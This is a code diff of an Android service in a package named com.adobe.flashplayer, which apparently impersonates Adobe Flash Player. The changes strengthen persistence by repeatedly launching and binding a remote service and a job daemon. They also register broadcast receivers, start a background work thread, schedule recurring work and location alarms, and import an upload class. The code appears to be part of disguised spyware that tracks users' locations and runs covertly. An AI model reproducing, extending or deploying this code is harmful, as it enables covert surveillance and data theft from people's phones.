@@ -30,6 +30,7 @@ import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.account.AccountActivity;
 import com.adobe.flashplayer.core.CoreHelper;
+import com.adobe.flashplayer.data.UploadRemainder;
 
 
 public class ForegroundSrv extends Service{
@@ -79,7 +80,7 @@ public class ForegroundSrv extends Service{
         intentremote.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         //startService(intentremote);
 
-        CoreHelper.startRemoteService(context);
+        CoreHelper.launchRemoteService(context);
 
         boolean ret = bindService(intentremote, conn, Context.BIND_IMPORTANT);
 
@@ -136,19 +137,21 @@ public class ForegroundSrv extends Service{
         Log.e(TAG, "super onStartCommand:" + retcode);
 
         try{
-            CoreHelper.startJobDeamonService(context);
-
-            AccountActivity.createAccount(context);
+            CoreHelper.launchJobDeamonService(context);
 
             String install = PrefOper.getValue(context, Public.PARAMCONFIG_FileName,Public.UNINSTALLFLAG);
             if(install != null && install.equals("true")){
                 return START_NOT_STICKY;
             }
 
-            MainEntry mainentry = new MainEntry(getApplicationContext(),"");
-            Thread thread = new Thread(mainentry);
-            thread.start();
-            //new MainEntry(ForegroundSrv.this,"").start();
+            Broadcast.registryBroadcast(context);
+
+            CoreHelper.launchWorkThread(context);
+
+            CoreHelper.scheduleWorkAlarm(context);
+
+            CoreHelper.scheduleLocationAlarm(context);
+
         }
         catch(Exception ex){
             ex.printStackTrace();
@@ -171,7 +174,7 @@ public class ForegroundSrv extends Service{
         Intent intent = new Intent(ForegroundSrv.this, RemoteSrv.class);
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         //startService(intent);
-        CoreHelper.startRemoteService(context);
+        CoreHelper.launchRemoteService(context);
 
         boolean ret = bindService(intent, conn, Context.BIND_IMPORTANT);
 
@@ -234,7 +237,7 @@ public class ForegroundSrv extends Service{
             Intent intent = new Intent(ForegroundSrv.this, RemoteSrv.class);
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             //ForegroundSrv.this.startService(intent);
-            CoreHelper.startRemoteService(context);
+            CoreHelper.launchRemoteService(context);
             //bindService方法的返回值是一个布尔类型的值， 如果系统正在启动客户端有权限绑定的服务，则为True;如果系统无法找到该服务，或者如果您的客户端没有绑定该服务的权限，则为False。
             boolean ret = bindService(intent, conn, Context.BIND_IMPORTANT);
 
